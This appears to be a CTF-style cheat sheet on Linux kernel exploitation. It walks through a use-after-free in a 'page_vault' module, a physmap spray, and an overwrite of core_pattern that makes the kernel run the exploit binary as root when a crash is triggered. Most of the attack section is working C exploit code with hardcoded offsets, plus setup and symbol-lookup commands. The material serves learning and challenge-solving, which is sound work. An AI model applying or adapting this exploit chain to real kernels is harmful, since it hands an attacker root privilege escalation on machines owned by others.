# Kernel Pwn

## Setup

```bash
mkdir fs && cd fs
zcat ../rootfs.cpio.gz | cpio -idmv
# Edit fs/init to add your exploit binary
find . | cpio -o -H newc | gzip > ../rootfs.cpio.gz

qemu-system-x86_64 \
    -kernel ./bzImage \
    -initrd ./rootfs.cpio.gz \
    -append "console=ttyS0 nokaslr" \
    -nographic \
    -cpu max,+smap,+smep \
    -m 256M
```

| Flag      | Purpose                                                                |
| --------- | ---------------------------------------------------------------------- |
| `nokaslr` | Disable KASLR (remove in real exploit, need info leak)                 |
| `+smap`   | Supervisor Mode Access Prevention (kernel can't read user pages)       |
| `+smep`   | Supervisor Mode Execution Prevention (kernel can't execute user pages) |

## Kernel UAF

**When:** A kernel module frees memory but does not NULL the pointer.

```c
case VAULT_FREE:
    __free_page(session->vault_page);  // freed
    return 0;                          // pointer still dangling!
```

After free, the dangling pointer still refers to the freed physical page. The page can be reused by any kernel allocation (slab, buddy allocator, other drivers). You can still read/write through the dangling pointer.

## Physmap Spray + core_pattern Overwrite

The kernel maps all physical memory into a contiguous virtual range called the **physmap**. By mmap-ing many pages in the physmap range, you can predict and control what the freed physical page gets reused for.

### Step 1: Open device + allocate page

```c
int fd = open("/dev/page_vault", O_RDWR);
ioctl(fd, VAULT_ALLOC);  // allocates one physical page
```

### Step 2: Spray the physmap

Map many pages in the physmap region. When the freed page is reused by the buddy allocator, it will land in one of our mapped areas.

```
Physical memory map:
+------------------+
| kernel code      |
+------------------+
| kernel data      |
|   (core_pattern) |  <- target string
+------------------+
| physmap          |
|   [spray pages]  |  <- mmap'd, covers physical page ranges
|   [spray pages]  |
|   [spray pages]  |
+------------------+
| ...              |
+------------------+

When a page is freed and reused:
  allocator picks a page -> lands in one of our spray regions
  we read back the page via UAF -> identifies the physical address
```

```c
for (int i = 0; i < 0x400; i++)
    addrs[i] = mmap((void*)(0x200000 + i*0x200000), 0x200000,
                    PROT_READ|PROT_WRITE,
                    MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
```

### Step 3: Free + read back

```c
ioctl(fd, VAULT_FREE);         // page -> buddy allocator
ioctl(fd, VAULT_READ, buf);    // UAF read
size_t pa = *(size_t *)&buf[0]; // leaked physical address
```

### Step 4: Compute core_pattern physmap address

`core_pattern` is a kernel string (controls what binary runs on crash). We compute its physmap address from the leaked physical address and known kernel offsets.

```
Leaked phys addr -> adjust to page boundary -> compute physmap virtual addr
  pa_adjusted = (pa & 0xfff...000) + 0x867 - zero_off + (core_pat & ~0xfff)
  offset_in_page = core_pat & 0xfff
```

```c
size_t zero_off = 0x35f9000;        // offset from leaked value to physmap zero page
size_t core_pat = 0x2808a60;        // kernel VA of core_pattern

pa = (pa & 0xfffffffff000) + 0x867 - zero_off + (core_pat & ~0xfff);
size_t off = core_pat & 0xfff;

vault_edit(&pa);                    // point dangling page to core_pattern

for (int i = 0; i < 0x400; i++)
    strcpy(addrs[i] + off, "|/proc/%P/fd/666 %P");
```

### Step 5: Trigger a crash

When the kernel crashes, it reads `core_pattern` and executes the program listed there as root.

```c
// Fork a child that:
// 1. Duplicates the exploit binary to fd 666
// 2. Triggers a NULL pointer dereference (SIGSEGV)
// Kernel runs: |/proc/<child_pid>/fd/666 <child_pid>
// This re-executes the exploit binary as the core handler

void crash() {
    if (fork() == 0) {
        setsid();
        int fd = memfd_create("", 0);
        sendfile(fd, open("/proc/self/exe", O_RDONLY), 0, 999999);
        dup2(fd, 666);
        *(size_t *)0 = 0;  // NULL deref -> SIGSEGV
    }
    wait(NULL);
}
```

The exploit runs again (with argv[1] = PID), and in this mode reads the flag.

## Finding Offsets

```bash
# Convert bzImage to ELF for symbol lookup
vmlinux-to-elf bzImage > vmlinux

# Find target symbols
nm vmlinux | grep core_pattern
nm vmlinux | grep modprobe_path  # alternative target

# Disassemble kernel module
objdump -d page_vault.ko
```
